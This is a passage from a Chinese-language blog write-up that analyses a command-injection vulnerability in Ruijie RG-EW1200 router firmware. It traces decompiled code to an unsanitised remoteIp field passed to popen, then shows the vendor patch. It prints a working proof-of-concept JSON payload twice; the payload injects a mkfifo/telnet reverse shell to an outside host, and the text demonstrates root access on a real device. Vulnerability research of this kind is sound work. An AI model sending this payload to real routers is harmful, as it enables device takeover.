class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;from_url&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v23 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v24 = v23;</span><br><span class="line">    <span class="keyword">if</span> ( v23 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v23 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v23, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">45</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v24);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;from_file&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v26 = v25;</span><br><span class="line">    <span class="keyword">if</span> ( v25 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v25 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v25, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">47</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v26);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;multi&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v27 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v28 = v27;</span><br><span class="line">    <span class="keyword">if</span> ( v27 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v27 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v27, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">48</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v28);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;not_commit&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v29 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v30 = v29;</span><br><span class="line">    <span class="keyword">if</span> ( v29 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v29 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v29, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">46</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v30);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;execute&quot;</span>, &amp;v37) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v31 = (_BYTE *)sub_404BAC(v37);</span><br><span class="line">    v32 = v31;</span><br><span class="line">    <span class="keyword">if</span> ( v31 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v31 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v31, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">42</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v32);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v33 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;data&quot;</span>, &amp;v37) == <span class="number">1</span> &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(v37) - <span class="number">4</span>) &lt; <span class="number">3</span> )<span class="comment">//判断params字段中是否存在data，如果存在的话将其赋值给v37，并且检查了data的值类型，只能为object,array,string三种类型，然后将data的值放到堆块的第四个指针处</span></span><br><span class="line">  &#123;</span><br><span class="line">    v34 = json_object_get_string(v37);</span><br><span class="line">    <span class="keyword">if</span> ( v34 )</span><br><span class="line">    &#123;</span><br><span class="line">      v35 = strdup(v34);</span><br><span class="line">      *(_DWORD *)(v3 + <span class="number">12</span>) = v35;</span><br><span class="line">      <span class="keyword">if</span> ( !v35 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="number">470</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_108;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v33;<span class="comment">//返回堆块地址</span></span><br></pre></td></tr></table></figure>

<p>将这个堆块装的各种数据绘制成图片可能更直观一些（如下）  <code>xxx</code> 代表有些保留字段，或者是一些标志位，它们在后续利用过程中并不重要，暂不详细记录</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651606.png" alt="image-20230816171132162" style="zoom:50%;" />





<p>使用 <code>GDB</code> 调试到此处看到的各字段信息如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651092.png" alt="image-20230816171530830"></p>
<p><code>parse_obj2_cmd</code> 函数结束后，会执行 <code>pkg_add_cmd(a1, v15)</code> ，它的核心作用就是在 <code>a1</code> 这个数据结构中记录了 <code>v15</code> 的指针，使得后续操作通过 <code>a1</code> 访问到刚刚解析出来的各个字段。不过这 <code>pkg_add_cmd</code> 函数里有一个谜之操作，在这行代码中 <code>*(_DWORD *)(a1 + 92) = a2 + 13</code> 是把 <code>a2</code> 也就是 <code>v15</code> 的值加上了 <code>13</code> 存储到了 <code>a1</code> 中，而通过后续的分析得知，之后访问这个 <code>v15</code> 的堆块是通过 <code>*(a1+92)-13</code> 得到的地址。存的时候 <code>+13</code> ，访问的时候 <code>-13</code> ，这里没太理解但并不影响我们后续的分析</p>
<h4 id="触发漏洞的调用链分析"><a href="#触发漏洞的调用链分析" class="headerlink" title="触发漏洞的调用链分析"></a>触发漏洞的调用链分析</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main ==&gt; add_pkg_cmd2_task ==&gt; uf_cmd_call ==&gt; ufm_handle ==&gt; remote_call ==&gt;sub_41A148</span><br></pre></td></tr></table></figure>

<p><code>json</code> 数据解析完成后，会调用 <code>add_pkg_cmd2_task</code> ，该函数通过访问之前解析出的各个字段，判断 <code>method</code> 是不是 <code>devCap</code> ，如果是的话可以调用后续的漏洞函数（不是 <code>devCap</code> 也可以触发漏洞但是调用链走的并不是我分析的这条）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//add_pkg_cmd2_task</span></span><br><span class="line">  <span class="keyword">if</span> ( dword_43897C &lt; <span class="number">1001</span> )<span class="comment">//这里正常就可以进入</span></span><br><span class="line">  &#123;</span><br><span class="line">    pthread_mutex_lock(*a1 + <span class="number">20</span>);</span><br><span class="line">    v3 = (_DWORD *)a1[<span class="number">22</span>];<span class="comment">//这个a1[22]也就是上面提到的*(a1+92)</span></span><br><span class="line">    v4 = v3 - <span class="number">13</span>;<span class="comment">//当时存地址时加了13，这里又减了13，所以v4就是上面记录了解析json各字段的那个堆块地址</span></span><br><span class="line">    <span class="keyword">for</span> ( i = *v3 - <span class="number">52</span>; ; i = *(_DWORD *)(i + <span class="number">52</span>) - <span class="number">52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 + <span class="number">13</span> == a1 + <span class="number">22</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        pthread_mutex_unlock(*a1 + <span class="number">20</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v6 = <span class="built_in">malloc</span>(<span class="number">20</span>);</span><br><span class="line">      v7 = (<span class="type">int</span> **)v6;</span><br><span class="line">......</span><br><span class="line">      v10 = (<span class="type">int</span> *)(v6 + <span class="number">4</span>);</span><br><span class="line">      v7[<span class="number">2</span>] = v10;</span><br><span class="line">      v7[<span class="number">1</span>] = v10;</span><br><span class="line">      *v7 = v4;</span><br><span class="line">      v7[<span class="number">4</span>] = (<span class="type">int</span> *)(v7 + <span class="number">3</span>);</span><br><span class="line">      v7[<span class="number">3</span>] = (<span class="type">int</span> *)(v7 + <span class="number">3</span>);</span><br><span class="line">......   </span><br><span class="line">      *v7 = v4;</span><br><span class="line">      v11 = (_DWORD *)*v4;</span><br><span class="line">      v12 = *(_DWORD *)*v4;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">3</span> )<span class="comment">//触发uf_cmd_call函数的关键就是method值的操作类型要为devCap,才能执行break跳出循环，调用uf_cmd_call函数（method为devConfig.get时，依然可以完成攻击，不过走的就是其他链了）</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        gettimeofday(v4 + <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">        uf_sys_handle(**v7, v4 + <span class="number">1</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">        gettimeofday(v4 + <span class="number">7</span>, <span class="number">0</span>);</span><br><span class="line">        sub_40B404(v7);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">2</span> &amp;&amp; !<span class="built_in">strcmp</span>(v11[<span class="number">1</span>], <span class="string">&quot;get&quot;</span>) &amp;&amp; !v11[<span class="number">9</span>] &amp;&amp; uf_cmd_buf_exist_check(v11[<span class="number">2</span>], <span class="number">2</span>, v11[<span class="number">3</span>], v4 + <span class="number">1</span>) )<span class="comment">//这个v12也就是解析的Operation type值</span></span><br><span class="line">      &#123;</span><br><span class="line">......</span><br><span class="line">      &#125;</span><br><span class="line">      sub_40B0C4(v7);</span><br><span class="line">LABEL_23:</span><br><span class="line">      v4 = (<span class="type">int</span> *)i;</span><br><span class="line">    &#125;</span><br><span class="line">    gettimeofday(v4 + <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( uf_cmd_call(*v4, v4 + <span class="number">1</span>) )<span class="comment">//后续的漏洞触发是在这个函数中            </span></span><br><span class="line">      v13 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v13 = <span class="number">1</span>;</span><br><span class="line">    v4[<span class="number">12</span>] = v13;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br></pre></td></tr></table></figure>



<p><code>uf_cmd_call</code> 函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//uf_cmd_call  </span></span><br><span class="line">  v2 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 || (v3 = *(_DWORD *)a1, *(_DWORD *)a1 &gt;= <span class="number">6u</span>) || (v4 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">8</span>)) == <span class="number">0</span> )<span class="comment">//这里检查了operator是否为空，Operation type的合法性检查以及module_value是否存在，在我们发送的报文中是不会进入这个if的</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(v103, <span class="number">0</span>, <span class="number">108</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">3</span> )<span class="comment">//因为操作类型设置为devCap，所以这个if可以进来</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">    v5 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">20</span>);<span class="comment">//这里取了remoteIp字段</span></span><br><span class="line">    <span class="keyword">if</span> ( !v5 || !*v5 )<span class="comment">//判断remoteIp字段是否存在</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_250;</span><br><span class="line">    v6 = a1;</span><br><span class="line">    <span class="keyword">if</span> ( !is_self_ip(*(_DWORD *)(v6 + <span class="number">20</span>)) )<span class="comment">//is_self_ip函数正常情况下返回的是0，这个if可以进入</span></span><br><span class="line">    &#123;</span><br><span class="line">      remote_call((<span class="type">int</span> *)a1, (<span class="type">const</span> <span class="type">char</span> **)a2);<span class="comment">//后续的漏洞触发是在这个函数中   </span></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>



<p><code>remote_call</code> 函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//remote_call</span></span><br><span class="line">  v9 = (<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">5</span>];<span class="comment">// v9为remoteIp字段</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1[<span class="number">2</span>], dword_4232A8) &amp;&amp; *a1 == <span class="number">5</span> )<span class="comment">// 拿module字段中的值与字符串esw做比较，这个if进不去</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">for</span> ( i = *(<span class="type">const</span> <span class="type">char</span> **)((<span class="type">char</span> *)&amp;sid_list_by_ip + v11); ; i = *(<span class="type">const</span> <span class="type">char</span> **)i )<span class="comment">// 这个if会进去</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == (<span class="type">char</span> *)&amp;sid_list_by_ip + v11 )   <span class="comment">// 这个if也会进去</span></span><br><span class="line">    &#123;</span><br><span class="line">      pthread_rwlock_unlock(&amp;sid_mutex);       </span><br><span class="line">      <span class="keyword">goto</span> LABEL_35; <span class="comment">// 跳转至触发漏洞函数</span></span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">LABEL_35:</span><br><span class="line">  v14 = sub_41A148((<span class="type">int</span>)a1);<span class="comment">//该函数存在最终的漏洞点</span></span><br><span class="line">......</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>



<p>最终存在命令注入的函数 <code>sub_41A148</code> </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sub_41A148</span></span><br><span class="line">  v2 = *(_DWORD *)(a1 + <span class="number">24</span>);<span class="comment">//v2为remotePwd的值</span></span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )<span class="comment">//因为remotePwd字段没有传，所以这里为空，进入else</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ufm_read_file(<span class="string">&quot;/etc/rg_config/admin&quot;</span>, &amp;v19);<span class="comment">// 没有这个文件，什么都读不出来</span></span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = (<span class="type">const</span> <span class="type">char</span> *)strdup(<span class="string">&quot;U2FsdGVkX18POF0/cM8IwywAcZUK8zQngpUv7C2zKng=&quot;</span>);<span class="comment">// 如果什么都没有读到的话，就将这个数据作为v19</span></span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    v17,</span><br><span class="line">    <span class="number">511</span>,</span><br><span class="line">    <span class="string">&quot;curl -m 5 -s -k -X POST http://%s/cgi-bin/luci/api/auth -H content-type:application/json -d &#x27;&#123;\&quot;method\&quot;:\&quot;login\&quot;,\&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;params\&quot;:&#123;\&quot;username\&quot;:\&quot;admini\&quot;,\&quot;password\&quot;:\&quot;%s\&quot;,\&quot;encry\&quot;:\&quot;true\&quot;&#125;&#125;&#x27;&quot;</span>,</span><br><span class="line">    *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">20</span>),<span class="comment">//此处会将remoteIp字段拼接进去</span></span><br><span class="line">    v19);</span><br><span class="line">......</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ufm_popen(v17, &amp;v18) || !v18 )<span class="comment">//最终由ufm_popen函数导致了命令执行</span></span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)curl get sid failed!&quot;</span>, <span class="string">&quot;ufm_remote_call.c&quot;</span>, <span class="string">&quot;fetch_get_sid&quot;</span>, <span class="number">289</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">......  </span><br></pre></td></tr></table></figure>



<p>上述的调用链已经分析的很清楚了并且都标注在了注释中，理清楚这些后攻击报文的构造就显而易见了。下面说一下我认为有必要提及的两点</p>
<h4 id="为什么-remotePwd-字段无法注入命令？"><a href="#为什么-remotePwd-字段无法注入命令？" class="headerlink" title="为什么 remotePwd 字段无法注入命令？"></a>为什么 <code>remotePwd</code> 字段无法注入命令？</h4><p>在 <code>EW_3.0(1)B11P204_EW1200I</code> 固件中，其实是可以从 <code>remotePwd</code> 字段中注入命令并执行的，而且在最新的固件中，也可以看到这里判断了 <code>remotePwd</code> 是否存在，如果存在的话也可以进行拼接，最终导致命令执行，相关代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  v2 = *(_DWORD *)(a1 + <span class="number">24</span>);<span class="comment">//v19为remotePwd的值</span></span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 = (<span class="type">const</span> <span class="type">char</span> *)strdup(v2);</span><br><span class="line">.......</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    v17,</span><br><span class="line">    <span class="number">511</span>,</span><br><span class="line">    <span class="string">&quot;curl -m 5 -s -k -X POST http://%s/cgi-bin/luci/api/auth -H content-type:application/json -d &#x27;&#123;\&quot;method\&quot;:\&quot;login\&quot;,\&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;params\&quot;:&#123;\&quot;username\&quot;:\&quot;admini\&quot;,\&quot;password\&quot;:\&quot;%s\&quot;,\&quot;encry\&quot;:\&quot;true\&quot;&#125;&#125;&#x27;&quot;</span>,</span><br><span class="line">    *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">20</span>),</span><br><span class="line">    v19);<span class="comment">//此处是拼接v19的</span></span><br><span class="line">  <span class="keyword">if</span> ( ufm_popen(v17, &amp;v18) || !v18 )<span class="comment">//loophole</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>但在最新的固件中对 <code>remotePwd</code> 字段注入命令是不成功的。</p>
<p>因为发现在 <code>parse_obj2_cmd</code> 函数中对 <code>json</code> 数据解析时，对于 <code>remotePwd</code> 字段的处理是存在 <code>Bug</code> 的，它限制了 <code>remotePwd</code> 字段要为 <code>array</code> 类型（如下代码所示），但是前端对于 <code>array</code> 类型的 <code>remotePwd</code> 会报错。这里其实能猜测出 <code>remotePwd</code> 字段是 <code>string</code> 类型，实际上代码应该是 <code>json_object_get_type(v37) == 6</code> 。这就导致设置 <code>remotePwd</code> 类型时要么是前端报错，要么是二进制程序中判断这个类型错误，从而阴差阳错的阻止了从这里进行注入</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;remotePwd&quot;</span>, &amp;v37) == <span class="number">1</span> &amp;&amp; json_object_get_type(v37) == <span class="number">5</span> )</span><br></pre></td></tr></table></figure>



<p>而在 <code>EW_3.0(1)B11P204_EW1200I</code> 固件中，它的功能实现都是由 <code>lua</code> 语言来完成的，最终命令执行的漏洞点如下（<code>fetch_sid</code> 函数的参数 <code>password</code> 就为 <code>remotePwd</code> 字段），因此在该固件版本中可以从 <code>remotePwd</code> 字段进行注入，而之后的版本因为 <code>Bug</code> 的原因无法进行注入</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651741.png" alt="image-20230818143633392" style="zoom: 67%;" />



<h4 id="攻击报文为什么这么构造？"><a href="#攻击报文为什么这么构造？" class="headerlink" title="攻击报文为什么这么构造？"></a>攻击报文为什么这么构造？</h4><p>攻击报文如下，这些字段都是缺一不可的。而没有出现的字段都是可有可无的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;method&quot;: &quot;devCap.get&quot;,</span><br><span class="line">	&quot;params&quot;: &#123;</span><br><span class="line">        &quot;module&quot;: &quot;123&quot;,</span><br><span class="line">        &quot;remoteIp&quot;: &quot;$(mkfifo /tmp/test;telnet 192.168.45.203 6666 0&lt;/tmp/test|/bin/sh &gt; /tmp/test)&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面来贴出证明这几个字段缺一不可的关键代码（其实上文的分析中都有提到，这里再汇总一下）</p>
<p><code>method</code> 和 <code>params</code> 不能为空，因为这里有如下检查，如果他们不存在的话会直接返回 <code>-1</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  v6 = json_object_object_get_ex(v3, <span class="string">&quot;params&quot;</span>, &amp;v18);</span><br><span class="line">  v7 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_27:</span><br><span class="line">    json_object_put(v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v4, <span class="string">&quot;method&quot;</span>, v19) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_26:</span><br><span class="line">    v7 = v4;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<p>而 <code>module</code> 也必须存在，并且 <code>module</code> 字段是 <code>params</code> 中的一个值。可以看到这里解析出了<code>params</code> ，给到 <code>v38</code>。而后 <code>module</code> 字段是从 <code>v38</code> 也就是 <code>params</code> 中解析出来的，如果 <code>module</code>  字段不存在的话，会执行 <code>return 0</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(a1, <span class="string">&quot;params&quot;</span>, &amp;v38) != <span class="number">1</span> )<span class="comment">//</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v38, <span class="string">&quot;module&quot;</span>, &amp;v37) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)obj_module is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">289</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">LABEL_109:</span><br><span class="line">    cmd_msg_free(v3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>



<p>而操作类型要设置为 <code>devCap</code> ，下面 <code>if(v3 == 3)</code> 才可以执行到 <code>remote_call</code> 函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( v3 == <span class="number">3</span> )<span class="comment">//因为操作类型设置为devCap，所以这个if可以进来</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">    v5 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">20</span>);<span class="comment">//这里取了remoteIp字段</span></span><br><span class="line">    <span class="keyword">if</span> ( !v5 || !*v5 )<span class="comment">//判断remoteIp字段是否存在</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_250;</span><br><span class="line">    v6 = a1;</span><br><span class="line">    <span class="keyword">if</span> ( !is_self_ip(*(_DWORD *)(v6 + <span class="number">20</span>)) )<span class="comment">//is_self_ip函数正常情况下返回的是0，这个if可以进入</span></span><br><span class="line">    &#123;</span><br><span class="line">      remote_call((<span class="type">int</span> *)a1, (<span class="type">const</span> <span class="type">char</span> **)a2);<span class="comment">//后续的漏洞触发是在这个函数中   </span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>操作符为 <code>get</code> 是因为在 <code>Lua</code> 文件中只有 <code>opt[i]</code> 为 <code>get</code> 的时候才在 <code>devCap</code> 表中定义了字符串 <code>get</code> 所对应函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> opt[i] == <span class="string">&quot;get&quot;</span> <span class="keyword">then</span></span><br><span class="line">    devCap[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>







<h2 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h2><p>这里直接拿在京东上买的真机演示，目标路由器型号为 <code>RG-EW1200</code>  这个固件版本是 <code>217</code>（问了下客服说这个目前最新只能升级到 <code>217</code> ，所以真机演示只能打这个 <code>217</code> 的了，但搭建了 <code>219</code> 的仿真环境也是可以攻击成功的）</p>
<p>首先登录路由器的管理后台</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231655305.png" alt="image-20230822171514008"></p>
<p>然后用 <code>Burp Suite</code> 抓包，拿到 <code>auth</code> 的值</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231655308.png" alt="image-20230822171558399"></p>
<p>向 <code>/cgi-bin/luci/api/cmd</code> 发送 <code>POST</code> 报文</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;method&quot;: &quot;devCap.get&quot;,</span><br><span class="line">	&quot;params&quot;: &#123;</span><br><span class="line">        &quot;module&quot;: &quot;123&quot;,</span><br><span class="line">        &quot;remoteIp&quot;: &quot;$(mkfifo /tmp/test;telnet 192.168.110.171 6666 0&lt;/tmp/test|/bin/sh &gt; /tmp/test)&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231655314.png" alt="image-20230822172352194"></p>
<h3 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h3><p>可以看到反弹 <code>shell</code> 成功，此时拿到了路由器的最高权限</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231655309.png" alt="image-20230822172340215"></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>官方在 <code>EW_3.0(1)B11P226</code> 版本，对上述漏洞发布了补丁   <a href="https://www.ruijie.com.cn/fw/rj/92255/">https://www.ruijie.com.cn/fw/rj/92255/</a></p>
<p>新添加了一个 <code>detect_remoteIp_invalid</code> 函数，该函数检查了 <code>remoteIP</code> 字段是否为纯数字或者字符 <code>.</code> ，因为正常的 <code>IP</code> 应该为 <code>xx.xx.xx.xx</code> 。这相当于对命令注入的字段做了一个过滤</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">detect_remoteIp_invalid</span><span class="params">(<span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  v3 = buf;</span><br><span class="line">  v4 = &amp;buf[len];</span><br><span class="line">  <span class="keyword">while</span> ( v3 != v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *v3;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v5 - <span class="number">48</span>) &lt; <span class="number">0xA</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v3;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        uf_log_printf(</span><br><span class="line">     